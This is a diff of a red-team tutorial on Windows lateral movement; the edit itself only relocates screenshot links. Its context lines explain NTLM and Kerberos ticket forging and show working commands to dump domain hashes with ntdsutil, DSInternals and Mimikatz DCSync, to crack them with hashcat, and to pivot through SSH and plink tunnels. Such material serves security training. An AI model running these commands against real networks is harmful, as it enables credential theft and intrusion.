@@ -36,13 +36,13 @@ Same as NTLMv1, just with some modification on the encryption algorithm.
 - The client then encrypts that challenge with his own pre-entered password’s hash (NTLM Hash) and sends his username, challenge, and challenge-response back to the server (Net-NTLM Hash).
 - The server tries to encrypt the challenge as well using its own copy of the user’s hash (NTLM Hash) which is stored locally on the server in case of local authentication, or pass the information to the domain controller in case of domain authentication, comparing it to the challenge-response, if equal then the login is successful.
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen1.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen1.png?raw=true)
 
 Note: To use NTLM authentication instead of Kerberos authentication, access IP addresses instead of Hostnames dir \\10.0.2.100\c$.
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen2.png?raw=true)
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen3.png?raw=true)
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen4.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen2.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen3.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen4.png?raw=true)
 
 LM / NTLM Hashes are used for Pass-The-Hash attacks, while Net-NTLMv1 / Net-NTLMv2 Hashes are used for NTLM Relay attacks.
 
@@ -52,7 +52,7 @@ NTLM Relay attack takes place at the Session Setup Request Authentication step.
 
 ## Kerberos Authentication
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen5.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen5.png?raw=true)
 
 - The client hashes the user’s password, uses that hash to encrypt the current timestamp, and sends the encrypted timestamp to the KDC. The KDC already has a copy of the user’s hash so it uses the hash and tries to decrypt that message to retrieve the timestamp. If the decryption is successful, then the KDC knows that the client used the correct hash and hence proved his identity to that KDC.
 - The Authentication service (AS) replies with two messages:
@@ -64,7 +64,7 @@ NTLM Relay attack takes place at the Session Setup Request Authentication step.
 	- A message for the client containing a session key for further requests between the client and the service he asked to access, which is encrypted using the key retrieved from the AS-REP step.
 - The client presents the message (TGS) from the TGS-REP step while connecting to the service along with an encrypted part, called authenticator message, this part includes the user’s name and timestamp which was encrypted and will be decrypted using the service session key. Then compare the username and timestamp from the TGS with the username and timestamp from the authenticator message.
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen6.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen6.png?raw=true)
 
 ### Silver Ticket (Forged TGS)
 ```
@@ -84,8 +84,8 @@ dir \\hydra-dc\c$
 - service: The service name, CIFS as am accessing filesharing service.
 - rc4: NTLM hash of the target service.
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen7.png?raw=true)
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen8.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen7.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen8.png?raw=true)
 
 Note: we can use the target machine hash as the service hash for filesharing service (CIFS).
 
@@ -105,8 +105,8 @@ klist
 dir \\hydra-dc\c$
 ```
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen9.png?raw=true)
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen10.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen9.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen10.png?raw=true)
 
 In the golden ticket, you’re not restricted to a single service, you got the KRBTGT, you can create your own TGT, so you can create a TGS for any service you want.
 
@@ -149,7 +149,7 @@ create full C:\audit
 quit
 quit
 ```
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen11.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen11.png?raw=true)
 
 Then use DSInternals script to extract all the hashed from this dump.
 
@@ -160,13 +160,13 @@ Import-Module .\DSInternals.psd1
 $key = Get-BootKey -SystemHiveFilePath '.\audit\registry\SYSTEM'
 Get-ADDBAccount -All -DBPath '.\audit\Active Directory\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt -Encoding ascii
 ```
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen12.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen12.png?raw=true)
 
 ### Mimikatz
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:marvel.local /all /csv"'
 ```
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen13.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen13.png?raw=true)
 
 ### Invoke DCSync
 ```
@@ -180,13 +180,13 @@ Invoke-DCSync -PWDumpFormat
 ```
 hashcat.exe -m 1000 -a 0 --username hashes.txt rockyou.txt
 ```
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen14.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen14.png?raw=true)
 
 ## Pivoting & Port Forwarding
 
 ### Local Port Forwarding
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen15.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen15.png?raw=true)
 
 1- Rinetd
 ```
@@ -233,7 +233,7 @@ ssh user@gateway -p 53 -L 127.0.0.1:8080:10.0.0.1:80
 
 ### Remote Port Forwarding
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen16.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen16.png?raw=true)
 
 1- SSH
 ```
@@ -267,7 +267,7 @@ cmd.exe /c echo y | plink.exe -ssh -l user -pw pass -P 53 -R 10.0.0.1:4444:127.0
 
 ### Dynamic Port Forwarding
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen17.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Images/Screen17.png?raw=true)
 
 ```
 # Target Machine // 10.0.0.1
